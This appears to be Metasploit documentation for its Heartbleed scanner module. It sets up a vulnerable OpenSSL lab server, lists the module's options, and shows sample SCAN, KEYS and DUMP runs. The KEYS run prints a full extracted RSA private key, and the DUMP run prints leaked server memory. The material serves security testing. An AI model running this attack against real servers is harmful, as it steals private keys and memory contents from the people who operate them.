
## Vulnerable Application

The heartbleed bug was extremely well [documented](http://heartbleed.com), but essentially boils down to a client being able to specify
how much memory is retrieved from the server when performing a TLS heartbeat.  This results in an arbitrary memory read, where an attacker
is able to read the contents of memory.

### Install OpenSSL 1.0.1d on Ubuntu 18.04

The following commands will download OpenSSL 1.0.1d, build and install it.
Finally, we'll use the built in `s_server` to start the service to be scanned.
`install_sw` is used to prevent an `install` [error](https://askubuntu.com/questions/454575/error-255-when-trying-to-install-openssl-1-0-1g-from-source). 

```
sudo apt-get install build-essential
wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1d.tar.gz
tar -zxf openssl-1.0.1d.tar.gz && cd openssl-1.0.1d
./config
sudo make
sudo make install_sw
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
/usr/local/ssl/bin/openssl s_server -key key.pem -cert cert.pem -accept 44330 -www
```

If you receive `gethostbyname failure` error in `openssl`, add the client (metasploit)
IP and hostname to your hosts file.

## Verification Steps

  1. Install a vulnerable OpenSSL, start the service
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/ssl/openssl_heartbleed```
  4. Do: ```set rhosts [ip]```
  5. Do: ```set action [ACTION]```
  6. Do: ```run```

## Options

  **Action**

  * SCAN: Scan the host to see if it is vulnerable.  If `verbose` is set to `true`, also print the memory that was dumped.  This is the default.
  * DUMP: Dump the memory and store it as loot.
  * KEYS: Similar to DUMP but scan the results for the private key.

  **TLS_CALLBACK**

  Protocol to use if a specific underlying protocol is required.  Default is `None`.

  **TLS_VERSION**

  The specific version of TLS (or SSL) to use, if only specific ones are avaialble.  Defaults to `1.0` (TLS1.0).

  **MAX_KEYTRIES**

  If Action is set to `KEYS`, the maximum amount of times to dump memory and attempt to retrieve the private key.
  Similar to `LEAK_COUNT` but only applies to `KEYS`.  Default is `50`.

  **STATUS_EVERY**

  If Action is set to `KEYS`, how often the status should be printed.  Default is `5`.

  **DUMPFILTER**

  A regular expresion (used in scan function) to use to filter the dump before storing.  Default is `nil`.

  **RESPONSE_TIMEOUT**

  How long to wait for the server to respond in seconds.  Default is `10`.

  **LEAK_COUNT**

  If Action is set to `SCAN` or `DUMP`, the maximum amount of times to dump memory.
  Similar to `MAX_KEYTRIES`.  Default is `1`.

## Advanced Options

  **HEARTBEAT_LENGTH**

  How much memory should attempt to be retrieved.  Default is `65535`.

  **XMPPDOMAIN**

  If `jabber` is selected for `TLS_CALLBACK`, the domain to use.  Default is `localhost`.

## Scenarios

### SCAN against s_server on Ubuntu 18.04 with OpenSSL 1.0.1d

With the default action of `SCAN` we can determine if the server is vulnerable or not.

```
msf5 > use auxiliary/scanner/ssl/openssl_heartbleed 
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
rhosts => 222.222.2.222
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rport 44330
rport => 44330
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 222.222.2.222:44330   - Heartbeat response with leak, 65535 bytes
[*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### KEYS against s_server on Ubuntu 18.04 with OpenSSL 1.0.1d

In order to help elicit the keys, we can run the following code to help populate memory with
the keys:

```
watch 'cat openssl-1.0.1d/key.pem; cat openssl-1.0.1d/cert.pem'
```

```
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action KEYS
action => KEYS
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run

[*] 222.222.2.222:44330   - Scanning for private keys
[*] 222.222.2.222:44330   - Getting public key constants...
[*] 222.222.2.222:44330   - 2019-10-13 01:32:17 UTC - Starting.
[*] 222.222.2.222:44330   - 2019-10-13 01:32:17 UTC - Attempt 0...
[+] 222.222.2.222:44330   - 2019-10-13 01:32:18 UTC - Got the private key
[*] 222.222.2.222:44330   - -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7ax3L0LRt5uZQTFOiJkX2xRn9ww/G87gMkMBAdeEzph7a2/i
C4stnajh9NsUbACv+dt8mtwgh0Vg4lMaI5iB9lXlqfsR17vIsW+/AZXj3Eo+B0QU
l8MpVilDvm3Hee0tE9NGLMR+Vk1Eq0UL+w7Gc/IswkFtj8XGMQ3Jc6OaJ6Ofh5hF
VlmyQBrtwvZ/20g5KtMbZFv1XX28bjEd47qfTo8nrnCsrjD7h7R42GrRw9hhvWse
sEa9VyTwQF0W8mxTYFx/7evXeJNVw1drmhJrxpGfb9gl8qzQgf6PQoi1LXaPAdk5
1cshKeGXmcA+1FR5HOdvWEqzCjMxApzdExNSgwIDAQABAoIBACmdYAT7ayL98JiU
nI6YV6/5Y7bDAy3ITEMgrkV3Sf6ufjWykl65ENShJGcuEOZUPHvALZIj5uIoiK04
JcSDyIWsRpk7p8UhUSOYUFZju1DwAupcxkpIVq2Kbh0itaGooJLvFEN0aDaOMu7W
GSHtVVwp1CJzOE7LL0eZhWNlCvHTgwwobaAUYEyrDmkOdWskMC3RGu5JrrfKTK+5
VUwMMAJ7Wf+d+xeTrNHwGGdEvHd23p1B1E3+axG0XqxI7wODz14iAWgd1zp2gSq2
Ji/II0E8Okwl3AR0d8SD0cJeEPHWlrr/6LzBUTHanDBGe2SXP/SMFSvyEpoPw/s8
vovI1okCgYEA8Ju7TuE4V2UQjZi8qcNAFnbxfcS9bk8S+BBKkgKtMY6wZT8h03fP
ouYot1IaRxMVlErrUeVtD/YKD+nhNFFYZGCSChjAhvf1rq/wzRILWpdGZ3SF9UuR
NlNpH1DcVZPOdTxCJ8DfjY72m/ugYysorQdmo9L58BhMKbfp9aHOR0cCgYEA/OCs
73xWEECKS7of0B+3CKriYT7fROu5wP9gFl3/FR8q7275TG2Iwg0rDz4NLGJhcVQ8
4bNAz+OglxqXkIVOf5Cuj8DibAw2JTr+MP5wQUaB0fPdwPcNw/fBq68x/+UpdcM2
B98b2uykN3Q2Zd2g3VVrKUOb4yJlE1EEvVrt8OUCgYEAq6oQe3jIn+Hla4D7qgs6
IE0AgwDpPliAaigFbCMoumDZjYL7eUrUA58+kXysbuU40jKZrjaIF4ktKKlvGcqn
zAXya+24/xLOYLH6lfU30Ix5mLpUEOy3UBE2wTcJ3Ky18oLpmD9NwEutuyBOEDLs
tHbBTkTqOdi8Dk+/RpcI+2UCgYEAj5qDeqiwMyCDqMd0w3sPNTPdxP2wSvJWlVww
0+LjNbpyZnAt0JIvZIuX1VsWngrsbTA6Nq3V83i/vK+UPLUHQ/gEuYv+yP8STIg4
y9fiJZ+Fn5YOa0OhJJVw/S9LhJc9uSt3Znbz2ZojE37CWYzHiom0hkVnpE/m+FY9
C880amUCgYAw8b+F3iBCEzioeUWW62c89yQaV0Ci/BQgvkhLsRRZr5hlt8+NWjSv
Nx2YT7eEcEIMOzOYF0zUH/gLo7UbZXGk/GlupqWP7kumwALz5Hu3gnx5+c69A0yL
FbawD4i1LZxrihOuuy3nt34hIlprjtW2WV49NiWnbwEzZo6ejm5NRg==
-----END RSA PRIVATE KEY-----

[*] 222.222.2.222:44330   - Private key stored in /root/.msf4/loot/20191012213218_default_222.222.2.222_openssl.heartble_250185.txt
[*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### DUMP against s_server on Ubuntu 18.04 with OpenSSL 1.0.1d

```
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
action => DUMP
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 222.222.2.222:44330   - Heartbeat response with leak, 65535 bytes
[+] 222.222.2.222:44330   - Heartbeat data stored in /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
[*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
[*] exec: cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin

���]�O���g�hE�_.[�MT��b��΋k�f��
�"�!98����5����
��	��32��ED��/�A���
                        �      �@�DA8u-�	b�,��Y'L��Մ�ձ3��-�bt����`�;ˋz���4���
�`���w��Vnvv�x���'�`���Y$�H                                                         |��k	E��ޞ=A�Gx�A��
                           a��f�D�9I��W�ϋ3/�V�s�D%����|������Z;��1FF���)�vC���ny7m��N1v/�&�Y�T@��e�3�D�ʗ�O��pc��,�y��q�G�g��z��`^�s�Mk*����Ou���E�ぜ���l]�%<,�@��S�зN�	"�����"���ct{uj��Ц�*N���a\{�5vRNW��-4S�^0b�e��7���=r���J>D��)V)C�m�y�-�F,�~VMD�E
�s��'����EVY�@�����H9*�[�]}�n1㺟N�'�p��0���x�j���a�k�F�W$�@]�lS`\���x�U�Wk�kƑ�o�%�Ё��B��-v��9��!)ᗙ�>�Ty�oXJ�
31��R��S0Q0U�]�v%C��#��*�B|c
K0U#0��]�v%C��#��*�B|c
K0U�0�0 *�H��
���^��#
       怅W7��G�w�n�*wFcR�~����l8�C*]��@��g+;=�|8�b߬3

1�ŏmA�,�s��l1v�d����m�i^�������y�}����5�2��'��s�M����G �U�2[������N�^p](������*\��3(ic�U��{�
           E�DMV~�,F�-�y�m�C)V)×D>J���o�Ȼ����U���#�S�`E� ܚ|���l��᨝-�
                                                                    �ok{�΄�C2��
                                                                               �g���N1A����B/w��!��)�U���B/w�����)�U�#�%��\ �rV���A#��_
                                                                                                                                       �m&r�]�J�
;���/_��
���rD���WMZt0���*ʟ����J�bB�U

|�ƭ���6���,s�d��7�s�8$,�I|��'�7ײ
                                �X��j�%����uj}��Y�a'�Ks��V��c.���vn:
B���c��q)GL�y0T�a&aZ�*q/#��������)�:յ�-����ހYi�R3�rb)��
�����5E����X?3w`>�"��p�퓱�Φ����q�/�}=9����'�PuJ�]�ȝ?l�]�cR$����-m���H,�D^��Ș{��5x��oS���-�ݴ;�v��]��I@��Á�K7H��
                                                                                                              i�,�ut�~�
                                                                                                                       ߃��u*n��w����.�fU���	R�X��y��^��|�0��udh����F������>��-��y�n�Š�윀�1��P�����W
                                                ��Ii�����/�|��+�l)Nv�c�3�U7��Xud@�o��z�(Lk ��0R|7���5�j^%����'L;S,"�����5	ӕv�;{q)�W�
                                                                                                                                          zJX��>j�;��f��t��DQ�Ez/�Rݜ13
1�ŏmA�,�s����)!��9��v-��B���Ь�%�o���k�kW�U�x���\`Sl�]@�$W�F�k�a���j�x���0��p�'�N���1n�}]�[d*9H�����@�YVE����'��s�
           E�DMV~�,F�-�y�m�C)V)×D>J���o�Ȼ����U���#�S�`E� ܚ|���l��᨝-�
                                                                    �ok{�΄�C2��
                                                                               �g���N1A����B/w��q��)�U!�Ɠ)�U���)�`0��)�U�@ɓ)�U!`��)�U!@��)�U!@��)�U���B/w��1��5E����X?3w`>�"��p�퓱�Φ����q�/�}=9����'�PuJ�]�ȝ?l�]�cR$����-m���H,�D^��Ș{��5x��oS���-�ݴq���)�U!��)�U��8NE<���GGΡ��)L��ңf�(+c��������'B<uΓU�PiS6�K��tgF�Z
       ������
�`dXQ4��
�m�Q�J�G�R�(��w�!?e��1��J�On��}�v@é���eW8�N���p3�)�U A���)�U  ���@'�/1����������������1����������������1����oI,�Щ�������\�ͭ�r��&�1�����w�ۯ�H��#
G�eO�IB�����u1�X�^�v�ͭ|Q��^��v�XC8��'a�Yu���!࿕)�U1�Y�"&�
                                                       ����
                                                           ����A��W��GЊ!���)�U�\7ڊ!p��)�U���)�U  `��)�U�\7ڊ!��)�U�\7ڊ!p��)�U�\7ڊ! ��)�U0��)�U  P��)�U�\����сFAp�0�:%6U�\7ڊ!���)�U�\7ڊ  �\7ڊ!�\7ڊ ��)�U 01���)�U1���)�UA�)�UA0)�UAapד)�U1���)�U����Z�Qe"�C)kUݠ�e6t7���6�u)��1�����
mL�n�*�]`����D�>a���K�@V|�����Õ)�U<���!�!b��{����C�M>
[����A8�%��Aθ�����ŪY�6K                              ��U߆�
                       ��XA��5j�X��q�'}��c�u���Ͷ�W���9�*5������g�3��Q	�a7ڊ�a7ڊ�ĕ)�U�ĕ)�UP	�W��(E ��
[&(yu0�.���I�V���t�1��fE�I̮N;��p˫�]�2�&^}        �� #����Ƃ�T�|i2�&~<�Q;T�B�TAﴕ:�/��H�^W��x�����]͓!��@@c7ڊ@c7ڊPd�)�UPd�)�Ulocalhost
::1		localhost6.localdomain6	localhost6
111.111.1.111   client

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
�� <%�N�O#&���+-91��,�q��k�sNV^I�
�n
  jgd0�`*�H��	��y�M�,0
0E1
   0	UAU10U

Some-State1!0U

201011031638Z0E1 Pty Ltd0
                0	UAU10U

Some-State1!0U

�0�ernet*�H��its Pty Ltd0�"0
���w/Bѷ��A1N���g�
                 ?�2CׄΘ{ko�
                          �-�����l���|�� �E`�S�#���U��׻ȱo����J>D��)V)C�m�y�-�F,�~VMD�E
�s��'����EVY�@�����H9*�[�]}�n1㺟N�'�p��0���x�j���a�k�F�W$�@]�lS`\���x�U�Wk�kƑ�o�%�Ё��B��-v��9��!)ᗙ�>�Ty�oXJ�
31��R��S0Q0U�]�v%C��#��*�B|c
K0U#0��]�v%C��#��*�B|c
K0U�0�0 *�H��
���^��#
       怅W7��G�w�n�*wFcR�~����l8�C*]��@��g+;=�|8�b߬3

�Ѓ�������"�l1v�d����m�i^�������y�}����5�2�K?�!��M����G �U�2[������N�^p](������*\��3(ic�U��{�
                                           GA8u-�	b�,��Y'L��Մ�ձ3��-�bt����`�;ˋz���4���
�`���w��Vnvv�x���'�`���Y$�H                                                                 |��k	E��ޞ=A�Gx�A��
                           a��f�D�9I��W�ϋ3/�V�s�D%����|������Z;��1FF���)�vC���ny7m��N1v/�&�Y�T@��e�3�D�ʗ�O��pc��,�y��q�G�g��z��`^�s�Mk*����Ou���E�ぜ����n��=*��LX-�*N���a\{�5vRNW��-4S�^0b�e��7���=r+A`d�)�Upt�)�U@q�U���)�U0;�)�U1����������������1߽�)bߜؐ0�x���.!�� ��4H�0܊�����\�A��������������������
G�eO�IB�*�H��@q�	��y�M�,0
0E1
   0	UAU10U

Some-State1!0U

201011031638Z0E1 Pty Ltd0
                0	UAU10U

Some-State1!0U

�0�ernet*�H��its Pty Ltd0�"0
���w/Bѷ��A1N���g�
                 ?�2CׄΘ{ko�
                          �-�����l���|�� �E`�S�#���U��׻ȱo����J>D��)V)C�m�y�-�F,�~VMD�E
�s��'����EVY�@�����H9*�[�]}�n1㺟N�'�p��0���x�j���a�k�F�W$�@]�lS`\���x�U�Wk�kƑ�o�%�Ё��B��-v��9��!)ᗙ�>�Ty�oXJ�
31��R��S0Q0U�]�v%C��#��*�B|c
K0U#0��]�v%C��#��*�B|c
K0U�0�0 *�H��
���^��#
       怅W7��G�w�n�*wFcR�~����l8�C*]��@��g+;=�|8�b߬3

�Ѓ�������"�l1v�d����m�i^�������y�}����5�2�q�Upѓ)�U D�)�U!�]�v%C��#��*�B|c�����*\��3(ic�U��{�
K!���)�U!��)�U!�]�v%C��#��*�B|c
K!�B�)�U����'�U0ؓ)�U�8�)�U0��)�U�@��)�U 9�)�U0��)�U`��)�U���)�U���)�U���)�U
G�eO��Pϓ)�U     �U0v�'�U�X�'�U�X�'�U�b�'�U�b�'�U�b�'�Up�'�U�W�'�U�a�'�q�'�U�m�'�Uxt�'�U�����Q@��)�UA�����w�ۯ�H��#
G�eO�IB�����u�)�U��)�U@!В�)�U!���)�U  !p��)�U  !���)�U�Ò)�U !���)�U  1�U���)�UQ ��)�UA����oI,�Щ�������\�ͭ�r��&��)�U@!1�Y�"&�
                                                                                                                           ����
                                                                                                                               ����A��W��GЊ`��)�U!Б�)�U�\7ڊ! ��)�U�\7ڊ��������!<�)�U�\7ڊ  �Ò)�U�\7ڊ�1p��)�U!@��)�U�\7ڊ`��)�U1@��)�U0QA�Y�"&�
                                                                                     ����
                                                                                         ����A��W��GЊ@10��)�Uq0��)�U���)�U�Rݜ13
1�ŏmA�,�s����)!��9��v-��B���Ь�%�o���k�kW�U�x���\`Sl�]@�$W�F�k�a���j�x���0��p�'�N���1n�}]�[d*9H�����@�YVE����'��s�
           E�DMV~�,F�-�y�m�C)V)×D>J���o�Ȼ����U���#�S�`E� ܚ|���l��᨝-�
                                                                    �ok{�΄�C2��
                                                                               �g���N1A����B/w�����)�U,�܁���$z�K

��
����k��졽N�"A�EV����<)�HN�m[��s��y�w��6��2]�Q���=Mx,f.|E=�,�����n�D9 h3�F�4���~n��
                                                                                  Zd�Z*wc�\�l��`Hԑ���0���TnzBeժ+e	A�#AV�̗��
���]v��M��ɸ�=��O@��ʘEf�!�J3��Cvj������[�t.R��c�{���.�cy��ݵu&$�n�*�!����5�1Њغjx��fۢԐ`�c�����d�B�8�3�Hn7ȩ՜�ku����i2��B}o~�/n$ ��J������bqF�B�v��9IM�t'Vu����L5Z
&�'��TO (�y��
�`��~�Ie:��cdn��]"�g����}J\plA�FvKkR1:? ٭�	-�@�_�B�|��B��S��f�cVES]��V�^��Bm�
                                                                                  �@���z���?_@D~o�]�
                                                                                                    1
V��WS��\���J�%�!݈��҅]�%�q���)�U1����������������08R6k��C����l�2�!S��|�G�j��G���>�w8q�_C��9�
{=o�n�� ��3�E�b1p|�%�h���<�a:bhj��-�6Z���2�w��!pB�)�U@��)�U!�f{��?�Py0��\�����,�s/��ޫ���5�ơ�{*�{�N#W�"��,�VW���a�#��a9�k?b��9濞~���e�^�MQ�� ��n��w�x�Z%1�ŏmA�,�s��'��s�
           E�DMV~�,F�-�y�m�C)V)×D>J���o�Ȼ����U���#�S�`E� ܚ|���l��᨝-�
                                                                    �ok{�΄�C2��
                                                                               �g���N1A����B/w��!�)�U���)�U�#�%��\ �rV���A#��_
                                                                                                                              �m&r�]�J�
;���/_��
���rD���WMZt0���*ʟ����J�bB�U

|�ƭ���6���,s�d��7�s�8$,�I|��'�7ײ
                                �X��j�%����uj}��Y�a'�Ks��V��c.���vn:
B���c��q)GL�y0T�a&aZ�*q/#��������)�:յ�-����ހYi�R3�rb)��
�����5E����X?3w`>�"��p�퓱�Φ����q�/�}=9����'�PuJ�]�ȝ?l�]�cR$����-m���H,�D^��Ș{��5x��oS���-�ݴ��	�:v���)6��jInld��P�-1��ɾ�
                                                                                                                         ��DyE�����l�"��e�#��Ǽ���-<KN�{�<�T�����&���E�:Y��D����ʎ�������c#�I��h5<�-�y�ұ�ST$m��U�8||�j�S.ϖ���W�~d��j��訦Dx�&�օ��U���Gj��b'�0��h�р.:�W����a���p�X'�X��N7es����C'�ɒ$(�bM��܍�Rݜ13
1�ŏmA�,�s����)!��9��v-��B���Ь�%�o���k�kW�U�x���\`Sl�]@�$W�F�k�a���j�x���0��p�'�N���1n�}]�[d*9H�����@�YVE����'��s�
           E�DMV~�,F�-�y�m�C)V)×D>J���o�Ȼ����U���#�S�`E� ܚ|���l��᨝-�
                                                                    �ok{�΄�C2��
                                                                               �g���N1A����B/w��q��)�U!�Ɠ)�U���)�``��)�U�@ɓ)�U!��)�U���B/w��!@��)�U!@��)�U���B/w��1��5E����X?3w`>�"��p�퓱�Φ����q�/�}=9����'�PuJ�]�ȝ?l�]�cR$����-m���H,�D^��Ș{��5x��oS���-�ݴq���)�U!��)�U��8NE<���GGΡ��)L��ңf�(+c��������'B<uΓU�PiS6�K��tgF�Z
              ������
�`dXQ4��
�m�Q�J�G�R�(��w�!?e��1��J�On��}�v@é���eW8�N���p3�)�U A���)�U  ���@'�/!�]7ڊ!�\7ڊ<�)�U 0���)�U1���)�U1��)�UAǕ)�U 1�\7ڊ�\7ڊ0 �\7ڊ!�)�U!�9�)!��)�U!@<�)�U !`;�)�U!0ӓ)1Q%c��ʹ�����������������!kaliUn�R�0h�"!ĝ���jfx��&���~�!�\7ڊ!ĝ���jfx��&���~�1����������������1����������������1
V��WS��\���J�%�!݈��҅]�%�q�A`��'�Uѓ)�U�ջ'�UA��'�U��)�U�ջ'�UAP��)�U�ד)�U0��)�Ua1����������������� ĕ)�U�`p�0�"ϙ�L���f�p����^�=�6��=�q�nw�9��0D}�ci��t���G=�x����сFAp�0�:%6�Gh�F(��U�TDw'��le�G�`}��9-����Z�Qe"�C)kUݠ�e6t7���6�u)��1�����
mL�n�*�]`����D�>a���K�@V|����q�'�UHn�'�U�v�'�U0v�'�U�X�'�U�X�'�U�b�'�U�b�'�U�b�'�Up�'�U�W�'�U�a�'�q�'�U�m�'�Uxt�'�U t�'�UxS�'�UpR�'�UPo�'�U�k�'�UXO�'�U`q�'�U�m�'�U�u�'�U(u�'�U�V�'�U�V�'�U`f�'�f�'�U]�'�U�\�'�U�o�'�U8l�'�U�U�'�Ue�'�U�[�'�U�p�'�U@m�'�U�n�'�U�k�'�U�M�'�UHM�'�U S�'�UR�'�UO�'�U�R�'�U�Q�'�U�N�'�U�M�'�U�L�'�UA���)�UA�@a7ڊ@a7ڊ@Ǖ)�U@Ǖ)�U��W��(E ��
[&(yu0�.���I�V���t�1��fE�I̮N;��p˫�]�2�&^}        �� #����Ƃ�T�|i2�&~<�Q;T�B�TAﴕ:�/��H�^W��x�����]͓!���]�O��bC��Z�A�gw��it��Zy
```

The contents of `/etc/hosts` is visible in this file, as it was edited to prevent the `gethostbyname failure` issue previously noted.
